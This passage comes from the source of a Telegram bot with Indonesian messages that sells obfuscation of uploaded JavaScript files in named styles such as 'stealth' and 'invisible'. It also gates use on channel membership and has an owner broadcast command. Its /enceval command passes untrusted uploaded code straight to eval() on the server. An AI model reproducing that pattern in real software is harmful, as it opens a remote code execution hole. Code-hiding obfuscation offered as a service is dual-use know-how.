            throw new Error(`Hasil obfuscation tidak valid: ${postObfuscationError.message}`);
        }

        log(`Mengirim file terenkripsi: encrypted-${file.file_name}`);
        await ctx.replyWithDocument(
            { source: encryptedPath, filename: `encrypted-${file.file_name}` },
            { caption: "✅ *File terenkripsi siap!*\nEncryption Success 🕊", parse_mode: "Markdown" }
        );
        await updateProgress(ctx, progressMessage, 100, `Enkripsi (${encryptionLevel})`);

        if (await fs.pathExists(encryptedPath)) {
            await fs.unlink(encryptedPath);
            log(`File sementara dihapus: ${encryptedPath}`);
        }
    } catch (error) {
        log("Kesalahan saat mengenkripsi", error);
        await ctx.replyWithMarkdown(`❌ *Kesalahan:* ${error.message || "Tidak diketahui"}\n_Coba lagi dengan kode Javascript yang valid!_`);
        if (await fs.pathExists(encryptedPath)) {
            await fs.unlink(encryptedPath);
            log(`File sementara dihapus setelah error: ${encryptedPath}`);
        }
    }
});

// Command /enceval (diperkuat dengan pemeriksaan channel)
bot.command("enceval", async (ctx) => {
users.add(ctx.from.id);
    saveUsers(users);
    const isMember = await checkChannelMembership(ctx);
    if (!isMember) {
        return ctx.replyWithMarkdown(
            "❌ E̶R̶R̶O̶R̶ │ ⓘ ᴀɴᴅᴀ ʜᴀʀᴜs ʙᴇʀɢᴀʙᴜɴɢ ᴋᴇ ᴄʜᴀɴɴᴇʟ @ChannelSkyNemesis ᴛᴇʀʟᴇʙɪʜ ᴅᴀʜᴜʟᴜ sᴇʙᴇʟᴜᴍ ᴍᴇᴍᴀᴋᴀɪ ʙᴏᴛ ᴏʙғ ɴʏᴀ!! \n" +
            "[ᴊᴏɪɴ sᴇᴋᴀʀᴀɴɢ](https://https://t.me/ChannelSkyNemesis)"
        );
    }
    const userId = ctx.from.id;

    // Cek apakah pengguna adalah premium
    if (!isPremium(userId)) {
      return ctx.reply('❌ This feature is for premium users only. Upgrade to premium to use this command.');
    }

    if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.document) {
        return ctx.replyWithMarkdown("❌ *Error:* Balas file .js dengan `/enceval [level]`!");
    }

    const file = ctx.message.reply_to_message.document;
    if (!file.file_name.endsWith(".js")) {
        return ctx.replyWithMarkdown("❌ *Error:* Hanya file .js yang didukung!");
    }

    const args = ctx.message.text.split(" ");
    const encryptionLevel = ["low", "medium", "high"].includes(args[1]) ? args[1] : "high";
    const encryptedPath = path.join(__dirname, `eval-encrypted-${file.file_name}`);

    try {
        const progressMessage = await ctx.replyWithMarkdown(
            "```css\n" +
            "🔒 EncryptBot\n" +
            ` ⚙️ Memulai Evaluasi (${encryptionLevel}) (1%)\n` +
            ` ${createProgressBar(1)}\n` +
            "```\n" +
            "Processing Encryption"
        );

        const fileLink = await ctx.telegram.getFileLink(file.file_id);
        log(`Mengunduh file untuk evaluasi: ${file.file_name}`);
        await updateProgress(ctx, progressMessage, 10, "Mengunduh");
        const response = await fetch(fileLink);
        const fileContent = await response.text();
        await updateProgress(ctx, progressMessage, 20, "Mengunduh Selesai");

        let evalResult;
        try {
            await updateProgress(ctx, progressMessage, 30, "Mengevaluasi Kode Asli");
            evalResult = eval(fileContent);
            if (typeof evalResult === "function") {
                evalResult = "Function detected (cannot display full output)";
            } else if (evalResult === undefined) {
                evalResult = "No return value";
            }
        } catch (evalError) {
            evalResult = `Evaluation error: ${evalError.message}`;
        }

        log(`Memvalidasi kode: ${file.file_name}`);
        await updateProgress(ctx, progressMessage, 40, "Memvalidasi Kode");
        try {
            new Function(fileContent);
        } catch (syntaxError) {
            throw new Error(`Kode tidak valid: ${syntaxError.message}`);
        }

        log(`Mengenkripsi dan mengevaluasi file dengan level: ${encryptionLevel}`);
        await updateProgress(ctx, progressMessage, 50, "Inisialisasi Hardened Enkripsi");
        const obfuscated = await JsConfuser.obfuscate(fileContent, getObfuscationConfig(encryptionLevel));
        await updateProgress(ctx, progressMessage, 70, "Transformasi Kode");
        await fs.writeFile(encryptedPath, obfuscated.code);
        await updateProgress(ctx, progressMessage, 90, "Finalisasi Enkripsi");

        log(`Memvalidasi hasil obfuscation: ${file.file_name}`);
        try {
            new Function(obfuscated.code);
        } catch (postObfuscationError) {
            throw new Error(`Hasil obfuscation tidak valid: ${postObfuscationError.message}`);
        }

        log(`Mengirim file terenkripsi dan hasil evaluasi: ${file.file_name}`);
        await ctx.replyWithMarkdown(
            "```css\n" +
            "🔒 EncryptBot - Evaluation Result\n" +
            "```\n" +
            `✨ *Original Code Result:* \n\`\`\`javascript\n${evalResult}\n\`\`\`\n` +
            `_Level: ${encryptionLevel} | Powered by NightCore`
        );
        await ctx.replyWithDocument(
            { source: encryptedPath, filename: `eval-encrypted-${file.file_name}` },
            { caption: "✅ *File terenkripsi siap!*\n_Encryption Success 🕊", parse_mode: "Markdown" }
        );
        await updateProgress(ctx, progressMessage, 100, `Evaluasi & Enkripsi (${encryptionLevel})`);

        if (await fs.pathExists(encryptedPath)) {
            await fs.unlink(encryptedPath);
            log(`File sementara dihapus: ${encryptedPath}`);
        }
    } catch (error) {
        log("Kesalahan saat mengenkripsi/evaluasi", error);
        await ctx.replyWithMarkdown(`❌ *Kesalahan:* ${error.message || "Tidak diketahui"}\n_Coba lagi dengan kode Javascript yang valid!_`);
        if (await fs.pathExists(encryptedPath)) {
            await fs.unlink(encryptedPath);
            log(`File sementara dihapus setelah error: ${encryptedPath}`);
        }
    }
});

// Command /encchina (diperkuat dengan pemeriksaan channel)
bot.command("encchina", async (ctx) => {
users.add(ctx.from.id);
    saveUsers(users);
    const isMember = await checkChannelMembership(ctx);
    if (!isMember) {
        return ctx.replyWithMarkdown(
            "❌ E̶R̶R̶O̶R̶ │ ⓘ ᴀɴᴅᴀ ʜᴀʀᴜs ʙᴇʀɢᴀʙᴜɴɢ ᴋᴇ ᴄʜᴀɴɴᴇʟ @ChannelSkyNemesis ᴛᴇʀʟᴇʙɪʜ ᴅᴀʜᴜʟᴜ sᴇʙᴇʟᴜᴍ ᴍᴇᴍᴀᴋᴀɪ ʙᴏᴛ ᴏʙғ ɴʏᴀ!! \n" +
            "[ᴊᴏɪɴ sᴇᴋᴀʀᴀɴɢ](https://https://t.me/ChannelSkyNemesis)"
        );
    }
    const userId = ctx.from.id;

    // Cek apakah pengguna adalah premium
    if (!isPremium(userId)) {
      return ctx.reply('❌ This feature is for premium users only. Upgrade to premium to use this command.');
    }

    if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.document) {
        return ctx.replyWithMarkdown("❌ *Error:* Balas file .js dengan `/encchina`!");
    }

    const file = ctx.message.reply_to_message.document;
    if (!file.file_name.endsWith(".js")) {
        return ctx.replyWithMarkdown("❌ *Error:* Hanya file .js yang didukung!");
    }

    const encryptedPath = path.join(__dirname, `china-encrypted-${file.file_name}`);

    try {
        const progressMessage = await ctx.replyWithMarkdown(
            "```css\n" +
            "🔒 EncryptBot\n" +
            ` ⚙️ Memulai (Hardened Mandarin) (1%)\n` +
            ` ${createProgressBar(1)}\n` +
            "```\n" +
            "Processing Encryption"
        );

        const fileLink = await ctx.telegram.getFileLink(file.file_id);
        log(`Mengunduh file untuk Mandarin obfuscation: ${file.file_name}`);
        await updateProgress(ctx, progressMessage, 10, "Mengunduh");
        const response = await fetch(fileLink);
        let fileContent = await response.text();
        await updateProgress(ctx, progressMessage, 20, "Mengunduh Selesai");

        log(`Memvalidasi kode: ${file.file_name}`);
        await updateProgress(ctx, progressMessage, 30, "Memvalidasi Kode");
        try {
            new Function(fileContent);
        } catch (syntaxError) {
            throw new Error(`Kode tidak valid: ${syntaxError.message}`);
        }

        log(`Mengenkripsi file dengan gaya Mandarin yang diperkuat`);
        await updateProgress(ctx, progressMessage, 40, "Inisialisasi Hardened Mandarin Obfuscation");
        const obfuscated = await JsConfuser.obfuscate(fileContent, getMandarinObfuscationConfig());
        await updateProgress(ctx, progressMessage, 60, "Transformasi Kode");
        await fs.writeFile(encryptedPath, obfuscated.code);
        await updateProgress(ctx, progressMessage, 80, "Finalisasi Enkripsi");

        log(`Memvalidasi hasil obfuscation: ${file.file_name}`);
        try {
            new Function(obfuscated.code);
        } catch (postObfuscationError) {
            throw new Error(`Hasil obfuscation tidak valid: ${postObfuscationError.message}`);
        }

        log(`Mengirim file terenkripsi gaya Mandarin: ${file.file_name}`);
        await ctx.replyWithDocument(
            { source: encryptedPath, filename: `china-encrypted-${file.file_name}` },
            { caption: "✅ *File terenkripsi (Hardened Mandarin) siap!*\nEncryption Success 🕊", parse_mode: "Markdown" }
        );
        await updateProgress(ctx, progressMessage, 100, "Hardened Mandarin Obfuscation Selesai");

        if (await fs.pathExists(encryptedPath)) {
            await fs.unlink(encryptedPath);
            log(`File sementara dihapus: ${encryptedPath}`);
        }
    } catch (error) {
        log("Kesalahan saat Mandarin obfuscation", error);
        await ctx.replyWithMarkdown(`❌ *Kesalahan:* ${error.message || "Tidak diketahui"}\n_Coba lagi dengan kode Javascript yang valid!_`);
        if (await fs.pathExists(encryptedPath)) {
            await fs.unlink(encryptedPath);
            log(`File sementara dihapus setelah error: ${encryptedPath}`);
        }
    }
});


bot.command("broadcast", async (ctx) => {
    // Tambahkan pengguna ke daftar broadcast
    users.add(ctx.from.id);
    saveUsers(users);
    const ownerId = ctx.from.id

    // Hanya admin yang bisa broadcast (ambil dari config.js)
  if (!OWNER_ID.includes(ownerId)) {
    return ctx.reply('❌ You are not authorized to use this command.');
  }

    const message = ctx.message.text.split(" ").slice(1).join(" ");
    if (!message) {
        return ctx.replyWithMarkdown("❌ *Error:* Tulis pesan untuk broadcast, contoh: `/broadcast Halo semua!`");
    }

    log(`Mengirim broadcast: ${message}`);
    let successCount = 0;
    let failCount = 0;

    for (const userId of users) {
        try {
            await bot.telegram.sendMessage(userId, message, { parse_mode: "Markdown" });
            successCount++;
        } catch (error) {
            log(`Gagal mengirim ke ${userId}`, error);
            failCount++;
        }
    }

    await ctx.replyWithMarkdown(
        `📢 *Broadcast Selesai:*\n` +
        `- Berhasil dikirim ke: ${successCount} pengguna\n` +
        `- Gagal dikirim ke: ${failCount} pengguna`
    );
});

// Command /encarab (diperkuat dengan pemeriksaan channel)
bot.command("encarab", async (ctx) => {
users.add(ctx.from.id);
    saveUsers(users);
    const isMember = await checkChannelMembership(ctx);
    if (!isMember) {
        return ctx.replyWithMarkdown(
            "❌ E̶R̶R̶O̶R̶ │ ⓘ ᴀɴᴅᴀ ʜᴀʀᴜs ʙᴇʀɢᴀʙᴜɴɢ ᴋᴇ ᴄʜᴀɴɴᴇʟ @ChannelSkyNemesis ᴛᴇʀʟᴇʙɪʜ ᴅᴀʜᴜʟᴜ sᴇʙᴇʟᴜᴍ ᴍᴇᴍᴀᴋᴀɪ ʙᴏᴛ ᴏʙғ ɴʏᴀ!! \n" +
            "[ᴊᴏɪɴ sᴇᴋᴀʀᴀɴɢ](https://https://t.me/ChannelSkyNemesis)"
        );
    }
    const userId = ctx.from.id;

    // Cek apakah pengguna adalah premium
    if (!isPremium(userId)) {
      return ctx.reply('❌ This feature is for premium users only. Upgrade to premium to use this command.');
    }

    if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.document) {
        return ctx.replyWithMarkdown("❌ *Error:* Balas file .js dengan `/encarab`!");
    }

    const file = ctx.message.reply_to_message.document;
    if (!file.file_name.endsWith(".js")) {
        return ctx.replyWithMarkdown("❌ *Error:* Hanya file .js yang didukung!");
    }

    const encryptedPath = path.join(__dirname, `arab-encrypted-${file.file_name}`);

    try {
        const progressMessage = await ctx.replyWithMarkdown(
            "```css\n" +
            "🔒 EncryptBot\n" +
            ` ⚙️ Memulai (Hardened Arab) (1%)\n` +
            ` ${createProgressBar(1)}\n` +
            "```\n" +
            "Processing Encryption"
        );

        const fileLink = await ctx.telegram.getFileLink(file.file_id);
        log(`Mengunduh file untuk Arab obfuscation: ${file.file_name}`);
        await updateProgress(ctx, progressMessage, 10, "Mengunduh");
        const response = await fetch(fileLink);
        let fileContent = await response.text();
        await updateProgress(ctx, progressMessage, 20, "Mengunduh Selesai");

        log(`Memvalidasi kode: ${file.file_name}`);
        await updateProgress(ctx, progressMessage, 30, "Memvalidasi Kode");
        try {
            new Function(fileContent);
        } catch (syntaxError) {
            throw new Error(`Kode tidak valid: ${syntaxError.message}`);
        }

        log(`Mengenkripsi file dengan gaya Arab yang diperkuat`);
        await updateProgress(ctx, progressMessage, 40, "Inisialisasi Hardened Arab Obfuscation");
        const obfuscated = await JsConfuser.obfuscate(fileContent, getArabObfuscationConfig());
        await updateProgress(ctx, progressMessage, 60, "Transformasi Kode");
        await fs.writeFile(encryptedPath, obfuscated.code);
        await updateProgress(ctx, progressMessage, 80, "Finalisasi Enkripsi");

        log(`Memvalidasi hasil obfuscation: ${file.file_name}`);
        try {
            new Function(obfuscated.code);
        } catch (postObfuscationError) {
            throw new Error(`Hasil obfuscation tidak valid: ${postObfuscationError.message}`);
        }

        log(`Mengirim file terenkripsi gaya Arab: ${file.file_name}`);
        await ctx.replyWithDocument(
            { source: encryptedPath, filename: `arab-encrypted-${file.file_name}` },
            { caption: "✅ *File terenkripsi (Hardened Arab) siap!*\nEncryption Success 🕊", parse_mode: "Markdown" }
        );
        await updateProgress(ctx, progressMessage, 100, "Hardened Arab Obfuscation Selesai");

        if (await fs.pathExists(encryptedPath)) {
            await fs.unlink(encryptedPath);
            log(`File sementara dihapus: ${encryptedPath}`);
        }
    } catch (error) {
        log("Kesalahan saat Arab obfuscation", error);
        await ctx.replyWithMarkdown(`❌ *Kesalahan:* ${error.message || "Tidak diketahui"}\n_Coba lagi dengan kode Javascript yang valid!_`);
        if (await fs.pathExists(encryptedPath)) {
            await fs.unlink(encryptedPath);
            log(`File sementara dihapus setelah error: ${encryptedPath}`);
        }
    }
});

// Command /encjapan (Japan-style obfuscation baru, diperkuat dengan pemeriksaan channel)
bot.command("encjapan", async (ctx) => {
users.add(ctx.from.id);
    saveUsers(users);
    const isMember = await checkChannelMembership(ctx);
    if (!isMember) {
        return ctx.replyWithMarkdown(
            "❌ E̶R̶R̶O̶R̶ │ ⓘ ᴀɴᴅᴀ ʜᴀʀᴜs ʙᴇʀɢᴀʙᴜɴɢ ᴋᴇ ᴄʜᴀɴɴᴇʟ @ChannelSkyNemesis ᴛᴇʀʟᴇʙɪʜ ᴅᴀʜᴜʟᴜ sᴇʙᴇʟᴜᴍ ᴍᴇᴍᴀᴋᴀɪ ʙᴏᴛ ᴏʙғ ɴʏᴀ!! \n" +
            "[ᴊᴏɪɴ sᴇᴋᴀʀᴀɴɢ](https://https://t.me/ChannelSkyNemesis)"
        );
    }
    const userId = ctx.from.id;

    // Cek apakah pengguna adalah premium
    if (!isPremium(userId)) {
      return ctx.reply('❌ This feature is for premium users only. Upgrade to premium to use this command.');
    }

    if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.document) {
        return ctx.replyWithMarkdown("❌ *Error:* Balas file .js dengan `/encjapan`!");
    }

    const file = ctx.message.reply_to_message.document;
    if (!file.file_name.endsWith(".js")) {
        return ctx.replyWithMarkdown("❌ *Error:* Hanya file .js yang didukung!");
    }

    const encryptedPath = path.join(__dirname, `japan-encrypted-${file.file_name}`);

    try {
        const progressMessage = await ctx.replyWithMarkdown(
            "```css\n" +
            "🔒 EncryptBot\n" +
            ` ⚙️ Memulai (Hardened Japan) (1%)\n` +
            ` ${createProgressBar(1)}\n` +
            "```\n" +
            "Processing Encryption"
        );

        const fileLink = await ctx.telegram.getFileLink(file.file_id);
        log(`Mengunduh file untuk Japan obfuscation: ${file.file_name}`);
        await updateProgress(ctx, progressMessage, 10, "Mengunduh");
        const response = await fetch(fileLink);
        let fileContent = await response.text();
        await updateProgress(ctx, progressMessage, 20, "Mengunduh Selesai");

        log(`Memvalidasi kode: ${file.file_name}`);
        await updateProgress(ctx, progressMessage, 30, "Memvalidasi Kode");
        try {
            new Function(fileContent);
        } catch (syntaxError) {
            throw new Error(`Kode tidak valid: ${syntaxError.message}`);
        }

        log(`Mengenkripsi file dengan gaya Japan yang diperkuat`);
        await updateProgress(ctx, progressMessage, 40, "Inisialisasi Hardened Japan Obfuscation");
        const obfuscated = await JsConfuser.obfuscate(fileContent, getJapanObfuscationConfig());
        await updateProgress(ctx, progressMessage, 60, "Transformasi Kode");
        await fs.writeFile(encryptedPath, obfuscated.code);
        await updateProgress(ctx, progressMessage, 80, "Finalisasi Enkripsi");

        log(`Memvalidasi hasil obfuscation: ${file.file_name}`);
        try {
            new Function(obfuscated.code);
        } catch (postObfuscationError) {
            throw new Error(`Hasil obfuscation tidak valid: ${postObfuscationError.message}`);
        }

        log(`Mengirim file terenkripsi gaya Japan: ${file.file_name}`);
        await ctx.replyWithDocument(
            { source: encryptedPath, filename: `japan-encrypted-${file.file_name}` },
            { caption: "✅ *File terenkripsi (Hardened Japan) siap!*\nEncryption Success 🕊", parse_mode: "Markdown" }
        );
        await updateProgress(ctx, progressMessage, 100, "Hardened Japan Obfuscation Selesai");

        if (await fs.pathExists(encryptedPath)) {
            await fs.unlink(encryptedPath);
            log(`File sementara dihapus: ${encryptedPath}`);
        }
    } catch (error) {
        log("Kesalahan saat Japan obfuscation", error);
        await ctx.replyWithMarkdown(`❌ *Kesalahan:* ${error.message || "Tidak diketahui"}\n_Coba lagi dengan kode Javascript yang valid!_`);
        if (await fs.pathExists(encryptedPath)) {
            await fs.unlink(encryptedPath);
            log(`File sementara dihapus setelah error: ${encryptedPath}`);
        }
    }
});

bot.command("encjapxab", async (ctx) => {
users.add(ctx.from.id);
    saveUsers(users);
    const isMember = await checkChannelMembership(ctx);
    if (!isMember) {
        return ctx.replyWithMarkdown(
            "❌ E̶R̶R̶O̶R̶ │ ⓘ ᴀɴᴅᴀ ʜᴀʀᴜs ʙᴇʀɢᴀʙᴜɴɢ ᴋᴇ ᴄʜᴀɴɴᴇʟ @ChannelSkyNemesis ᴛᴇʀʟᴇʙɪʜ ᴅᴀʜᴜʟᴜ sᴇʙᴇʟᴜᴍ ᴍᴇᴍᴀᴋᴀɪ ʙᴏᴛ ᴏʙғ ɴʏᴀ!! \n" +
            "[ᴊᴏɪɴ sᴇᴋᴀʀᴀɴɢ](https://https://t.me/ChannelSkyNemesis)"
        );
    }
    const userId = ctx.from.id;

    // Cek apakah pengguna adalah premium
    if (!isPremium(userId)) {
      return ctx.reply('❌ This feature is for premium users only. Upgrade to premium to use this command.');
    }

    if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.document) {
        return ctx.replyWithMarkdown("❌ *Error:* Balas file .js dengan `/encjapxab`!");
    }

    const file = ctx.message.reply_to_message.document;
    if (!file.file_name.endsWith(".js")) {
        return ctx.replyWithMarkdown("❌ *Error:* Hanya file .js yang didukung!");
    }

    const encryptedPath = path.join(__dirname, `japan-arab-encrypted-${file.file_name}`);

    try {
        const progressMessage = await ctx.replyWithMarkdown(
            "```css\n" +
            "🔒 EncryptBot\n" +
            ` ⚙️ Memulai (Hardened Japan X Arab ) (1%)\n` +
            ` ${createProgressBar(1)}\n` +
            "```\n" +
            "Processing Encryption"
        );

        const fileLink = await ctx.telegram.getFileLink(file.file_id);
        log(`Mengunduh file untuk Japan X Arab  obfuscation: ${file.file_name}`);
        await updateProgress(ctx, progressMessage, 10, "Mengunduh");
        const response = await fetch(fileLink);
        let fileContent = await response.text();
        await updateProgress(ctx, progressMessage, 20, "Mengunduh Selesai");

        log(`Memvalidasi kode: ${file.file_name}`);
        await updateProgress(ctx, progressMessage, 30, "Memvalidasi Kode");
        try {
            new Function(fileContent);
        } catch (syntaxError) {
            throw new Error(`Kode tidak valid: ${syntaxError.message}`);
        }

        log(`Mengenkripsi file dengan gaya Japan X Arab  yang diperkuat`);
        await updateProgress(ctx, progressMessage, 40, "Inisialisasi Hardened Japan X Arab  Obfuscation");
        const obfuscated = await JsConfuser.obfuscate(fileContent, getJapanxArabObfuscationConfig());
        await updateProgress(ctx, progressMessage, 60, "Transformasi Kode");
        await fs.writeFile(encryptedPath, obfuscated.code);
        await updateProgress(ctx, progressMessage, 80, "Finalisasi Enkripsi");

        log(`Memvalidasi hasil obfuscation: ${file.file_name}`);
        try {
            new Function(obfuscated.code);
        } catch (postObfuscationError) {
            throw new Error(`Hasil obfuscation tidak valid: ${postObfuscationError.message}`);
        }

        log(`Mengirim file terenkripsi gaya Japan X Arab : ${file.file_name}`);
        await ctx.replyWithDocument(
            { source: encryptedPath, filename: `japan-arab-encrypted-${file.file_name}` },
            { caption: "✅ *File terenkripsi (Hardened Japan X Arab ) siap!*\nEncryption Success 🕊", parse_mode: "Markdown" }
        );
        await updateProgress(ctx, progressMessage, 100, "Hardened Japan X Arab  Obfuscation Selesai");

        if (await fs.pathExists(encryptedPath)) {
            await fs.unlink(encryptedPath);
            log(`File sementara dihapus: ${encryptedPath}`);
        }
    } catch (error) {
        log("Kesalahan saat Japan X Arab  obfuscation", error);
        await ctx.replyWithMarkdown(`❌ *Kesalahan:* ${error.message || "Tidak diketahui"}\n_Coba lagi dengan kode Javascript yang valid!_`);
        if (await fs.pathExists(encryptedPath)) {
            await fs.unlink(encryptedPath);
            log(`File sementara dihapus setelah error: ${encryptedPath}`);
        }
    }
});
// Command /encnew (diperkuat dengan pemeriksaan channel)
bot.command("encnew", async (ctx) => {
users.add(ctx.from.id);
    saveUsers(users);
    const isMember = await checkChannelMembership(ctx);
    if (!isMember) {
        return ctx.replyWithMarkdown(
            "❌ E̶R̶R̶O̶R̶ │ ⓘ ᴀɴᴅᴀ ʜᴀʀᴜs ʙᴇʀɢᴀʙᴜɴɢ ᴋᴇ ᴄʜᴀɴɴᴇʟ @ChannelSkyNemesis ᴛᴇʀʟᴇʙɪʜ ᴅᴀʜᴜʟᴜ sᴇʙᴇʟᴜᴍ ᴍᴇᴍᴀᴋᴀɪ ʙᴏᴛ ᴏʙғ ɴʏᴀ!! \n" +
            "[ᴊᴏɪɴ sᴇᴋᴀʀᴀɴɢ](https://https://t.me/ChannelSkyNemesis)"
        );
    }
    const userId = ctx.from.id;

    // Cek apakah pengguna adalah premium
    if (!isPremium(userId)) {
      return ctx.reply('❌ This feature is for premium users only. Upgrade to premium to use this command.');
    }

    if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.document) {
        return ctx.replyWithMarkdown("❌ *Error:* Balas file .js dengan `/encnew`!");
    }

    const file = ctx.message.reply_to_message.document;
    if (!file.file_name.endsWith(".js")) {
        return ctx.replyWithMarkdown("❌ *Error:* Hanya file .js yang didukung!");
    }

    const encryptedPath = path.join(__dirname, `new-encrypted-${file.file_name}`);

    try {
        const progressMessage = await ctx.replyWithMarkdown(
            "```css\n" +
            "🔒 EncryptBot\n" +
            ` ⚙️ Memulai (Hardened Advanced) (1%)\n` +
            ` ${createProgressBar(1)}\n` +
            "```\n" +
            "Processing Encryption"
        );

        const fileLink = await ctx.telegram.getFileLink(file.file_id);
        log(`Mengunduh file untuk New obfuscation: ${file.file_name}`);
        await updateProgress(ctx, progressMessage, 10, "Mengunduh");
        const response = await fetch(fileLink);
        let fileContent = await response.text();
        await updateProgress(ctx, progressMessage, 20, "Mengunduh Selesai");

        log(`Memvalidasi kode: ${file.file_name}`);
        await updateProgress(ctx, progressMessage, 30, "Memvalidasi Kode");
        try {
            new Function(fileContent);
        } catch (syntaxError) {
            throw new Error(`Kode tidak valid: ${syntaxError.message}`);
        }

        log(`Mengenkripsi file dengan metode baru yang diperkuat`);
        await updateProgress(ctx, progressMessage, 40, "Inisialisasi Hardened Advanced Obfuscation");
        const obfuscated = await JsConfuser.obfuscate(fileContent, getNewObfuscationConfig());
        await updateProgress(ctx, progressMessage, 60, "Transformasi Kode");
        await fs.writeFile(encryptedPath, obfuscated.code);
        await updateProgress(ctx, progressMessage, 80, "Finalisasi Enkripsi");

        log(`Memvalidasi hasil obfuscation: ${file.file_name}`);
        try {
            new Function(obfuscated.code);
        } catch (postObfuscationError) {
            throw new Error(`Hasil obfuscation tidak valid: ${postObfuscationError.message}`);
        }

        log(`Mengirim file terenkripsi metode baru: ${file.file_name}`);
        await ctx.replyWithDocument(
            { source: encryptedPath, filename: `new-encrypted-${file.file_name}` },
            { caption: "✅ *File terenkripsi (Hardened Advanced) siap!*\nEncryption Success 🕊", parse_mode: "Markdown" }
        );
        await updateProgress(ctx, progressMessage, 100, "Hardened Advanced Obfuscation Selesai");

        if (await fs.pathExists(encryptedPath)) {
            await fs.unlink(encryptedPath);
            log(`File sementara dihapus: ${encryptedPath}`);
        }
    } catch (error) {
        log("Kesalahan saat New obfuscation", error);
        await ctx.replyWithMarkdown(`❌ *Kesalahan:* ${error.message || "Tidak diketahui"}\n_Coba lagi dengan kode Javascript yang valid!_`);
        if (await fs.pathExists(encryptedPath)) {
            await fs.unlink(encryptedPath);
            log(`File sementara dihapus setelah error: ${encryptedPath}`);
        }
    }
});

bot.command("encinvis", async (ctx) => {
users.add(ctx.from.id);
    saveUsers(users);
    const isMember = await checkChannelMembership(ctx);
    if (!isMember) {
        return ctx.replyWithMarkdown(
            "❌ E̶R̶R̶O̶R̶ │ ⓘ ᴀɴᴅᴀ ʜᴀʀᴜs ʙᴇʀɢᴀʙᴜɴɢ ᴋᴇ ᴄʜᴀɴɴᴇʟ @ChannelSkyNemesis ᴛᴇʀʟᴇʙɪʜ ᴅᴀʜᴜʟᴜ sᴇʙᴇʟᴜᴍ ᴍᴇᴍᴀᴋᴀɪ ʙᴏᴛ ᴏʙғ ɴʏᴀ!! \n" +
            "[ᴊᴏɪɴ sᴇᴋᴀʀᴀɴɢ](https://https://t.me/ChannelSkyNemesis)"
        );
    }
    const userId = ctx.from.id;

    // Cek apakah pengguna adalah premium
    if (!isPremium(userId)) {
      return ctx.reply('❌ This feature is for premium users only. Upgrade to premium to use this command.');
    }

    if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.document) {
        return ctx.replyWithMarkdown("❌ *Error:* Balas file .js dengan `/encinvis`!");
    }

    const file = ctx.message.reply_to_message.document;
    if (!file.file_name.endsWith(".js")) {
        return ctx.replyWithMarkdown("❌ *Error:* Hanya file .js yang didukung!");
    }

    const encryptedPath = path.join(__dirname, `invis-encrypted-${file.file_name}`);

    try {
        const progressMessage = await ctx.replyWithMarkdown(
            "```css\n" +
            "🔒 EncryptBot\n" +
            ` ⚙️ Memulai (Hardened Invisible) (1%)\n` +
            ` ${createProgressBar(1)}\n` +
            "```\n" +
            "Processing Encryption"
        );

        const fileLink = await ctx.telegram.getFileLink(file.file_id);
        log(`Mengunduh file untuk Invisible obfuscation: ${file.file_name}`);
        await updateProgress(ctx, progressMessage, 10, "Mengunduh");
        const response = await fetch(fileLink);
        let fileContent = await response.text();
        await updateProgress(ctx, progressMessage, 20, "Mengunduh Selesai");

        log(`Memvalidasi kode: ${file.file_name}`);
        await updateProgress(ctx, progressMessage, 30, "Memvalidasi Kode");
        try {
            new Function(fileContent);
        } catch (syntaxError) {
            throw new Error(`Kode tidak valid: ${syntaxError.message}`);
        }

        log(`Mengenkripsi file dengan gaya Invisible yang diperkuat`);
        await updateProgress(ctx, progressMessage, 40, "Inisialisasi Hardened Invisible Obfuscation");
        const obfuscated = await JsConfuser.obfuscate(fileContent, getInvisObfuscationConfig());
        await updateProgress(ctx, progressMessage, 60, "Transformasi Kode");
        await fs.writeFile(encryptedPath, obfuscated.code);
        await updateProgress(ctx, progressMessage, 80, "Finalisasi Enkripsi");

        log(`Memvalidasi hasil obfuscation: ${file.file_name}`);
        try {
            new Function(obfuscated.code);
        } catch (postObfuscationError) {
            throw new Error(`Hasil obfuscation tidak valid: ${postObfuscationError.message}`);
        }

        log(`Mengirim file terenkripsi gaya Invisible: ${file.file_name}`);
        await ctx.replyWithDocument(
            { source: encryptedPath, filename: `invis-encrypted-${file.file_name}` },
            { caption: "✅ *File terenkripsi (Hardened Invisible) siap!*\nEncryption Success 🕊", parse_mode: "Markdown" }
        );
        await updateProgress(ctx, progressMessage, 100, "Hardened Invisible Obfuscation Selesai");

        if (await fs.pathExists(encryptedPath)) {
            await fs.unlink(encryptedPath);
            log(`File sementara dihapus: ${encryptedPath}`);
        }
    } catch (error) {
        log("Kesalahan saat Invisible obfuscation", error);
        await ctx.replyWithMarkdown(`❌ *Kesalahan:* ${error.message || "Tidak diketahui"}\n_Coba lagi dengan kode Javascript yang valid!_`);
        if (await fs.pathExists(encryptedPath)) {
            await fs.unlink(encryptedPath);
            log(`File sementara dihapus setelah error: ${encryptedPath}`);
        }
    }
});

bot.command("encstealth", async (ctx) => {
users.add(ctx.from.id);
    saveUsers(users);
    const isMember = await checkChannelMembership(ctx);
    if (!isMember) {
        return ctx.replyWithMarkdown(
            "❌ E̶R̶R̶O̶R̶ │ ⓘ ᴀɴᴅᴀ ʜᴀʀᴜs ʙᴇʀɢᴀʙᴜɴɢ ᴋᴇ ᴄʜᴀɴɴᴇʟ @ChannelSkyNemesis ᴛᴇʀʟᴇʙɪʜ ᴅᴀʜᴜʟᴜ sᴇʙᴇʟᴜᴍ ᴍᴇᴍᴀᴋᴀɪ ʙᴏᴛ ᴏʙғ ɴʏᴀ!! \n" +
            "[ᴊᴏɪɴ sᴇᴋᴀʀᴀɴɢ](https://https://t.me/ChannelSkyNemesis)"
        );
    }
    const userId = ctx.from.id;

    // Cek apakah pengguna adalah premium
    if (!isPremium(userId)) {
      return ctx.reply('❌ This feature is for premium users only. Upgrade to premium to use this command.');
    }

    if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.document) {
        return ctx.replyWithMarkdown("❌ *Error:* Balas file .js dengan `/encstealth`!");
    }

    const file = ctx.message.reply_to_message.document;
    if (!file.file_name.endsWith(".js")) {
        return ctx.replyWithMarkdown("❌ *Error:* Hanya file .js yang didukung!");
    }

    const encryptedPath = path.join(__dirname, `stealth-encrypted-${file.file_name}`);

    try {
        const progressMessage = await ctx.replyWithMarkdown(
            "```css\n" +
